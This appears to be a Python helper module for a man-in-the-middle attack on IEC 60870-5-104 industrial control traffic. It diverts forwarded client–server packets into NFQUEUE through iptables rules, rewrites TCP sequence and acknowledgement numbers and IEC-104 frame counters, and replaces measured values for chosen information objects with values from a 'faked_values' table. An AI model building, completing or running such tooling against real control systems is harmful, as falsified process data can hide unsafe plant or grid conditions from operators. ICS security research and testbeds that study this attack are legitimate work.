from kamene.layers.inet import IP
import ipaddress
import iptc


def build_iec_packet(tx, rx, ioa, value):
    apci = b'h\x10' + (tx * 2).to_bytes(2, "little") + (rx * 2).to_bytes(2, "little")
    asdu = b'\x31\x01\x06\x00\x01\x00' + ioa.to_bytes(3, "little") + value.to_bytes(2, "little") + b'\x00'
    return apci + asdu


def extract_tcp_details(packet: IP):
    seq = packet['TCP'].seq
    seq_next = packet['TCP'].seq
    if hasattr(packet['TCP'], "payload"):
        seq_next += len(packet['TCP'].payload)
    ack = packet['TCP'].ack
    return seq, seq_next, ack


def extract_iec_details(packet: IP):
    payload = extract_tcp_payload(packet)
    if payload is not None and payload[0] == 0x68 and payload[1] > 0x04:
        tx = int.from_bytes(payload[2:4], "little") // 2
        rx = int.from_bytes(payload[4:6], "little") // 2
        return tx, rx
    return None


def update_tcp_header(packet: IP, seq, ack):
    packet['TCP'].seq = seq
    packet['TCP'].ack = ack
    return packet


def update_checksums(packet: IP):
    packet['TCP'].chksum = None
    packet['IP'].chksum = None
    return packet


def extract_tcp_payload(packet: IP):
    if hasattr(packet['TCP'], "load"):
        return packet['TCP'].load
    return None


def update_iec_apci(packet: IP, tx, rx):
    payload = extract_tcp_payload(packet)
    if payload is not None and payload[0] == 0x68 and payload[1] > 0x04:
        payload = payload[0:2] + (2 * tx).to_bytes(2, "little") + (2 * rx).to_bytes(2, "little") + payload[6:]
        packet['TCP'].payload = payload
        return packet
    return packet


def update_iec_asdu(packet: IP, faked_values: dict):
    if extract_ioa_values(packet) is None:
        return packet
    ioa, value = extract_ioa_values(packet)
    if ioa in faked_values.keys():
        new_value = faked_values[ioa]
        payload = extract_tcp_payload(packet)
        if payload is None:
            return packet
        payload = payload[:-6] + ioa.to_bytes(3, "little") + new_value.to_bytes(2, "little") + b'\x00'
        packet['TCP'].payload = payload
    return packet


def extract_ioa_values(packet: IP):
    payload = extract_tcp_payload(packet)
    if payload is not None and payload[0] == 0x68 and payload[1] > 0x08 and payload[6] == 49:
        ioa = int.from_bytes(payload[-6:-3], "little")
        value = int.from_bytes(payload[-3:-1], "little")
        return ioa, value
    return None


def is_ipv4_address(data) -> bool:
    try:
        ip = ipaddress.ip_address(data)
        if ip.version == 4:
            return True
        return False
    except ValueError:
        return False


def is_tcp_port(data: int) -> bool:
    if 0 < data <= 65535:
        return True
    return False


def setup_iptables(client_ip: str, server_ip: str, server_port: int) -> None:
    rule_1 = {'dst': client_ip + '/32', 'protocol': 'tcp', 'tcp': {'sport': str(server_port)},
              'target': {'NFQUEUE': {'queue-num': '1'}}, 'counters': (0, 0)}
    rule_2 = {'dst': server_ip + '/32', 'protocol': 'tcp', 'tcp': {'dport': str(server_port)},
              'target': {'NFQUEUE': {'queue-num': '1'}}, 'counters': (0, 0)}
    iptc.easy.insert_rule('filter', 'FORWARD', rule_1)
    iptc.easy.insert_rule('filter', 'FORWARD', rule_2)
